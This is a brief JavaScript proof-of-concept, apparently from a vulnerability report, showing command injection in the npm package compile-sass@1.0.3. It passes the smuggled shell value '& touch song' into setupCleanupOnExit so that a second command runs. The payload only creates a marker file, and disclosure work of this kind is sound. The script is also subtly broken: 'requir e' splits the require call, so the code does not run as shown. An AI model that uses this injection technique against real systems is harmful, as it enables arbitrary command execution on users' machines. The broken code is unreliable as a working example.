/**
 * compile-sass@1.0.3 is vulnerabel to command injection.
 * the injection point is located in line 119 of index file "dist/index.js"
 * in function setupCleanupOnExit(cssPath).
 * the "cssPath" can be controlled by users without any sanitization.
 */

function sleep(millis) {
    return new Promise(resolve => setTimeout(resolve, millis));
}
async function main(){
    var a = requir e('compile-sass');
    a.setupCleanupOnExit('& touch song');
    console.log('Press Ctrl-C in 3 seconds...')
    await sleep(3000);
}
main();
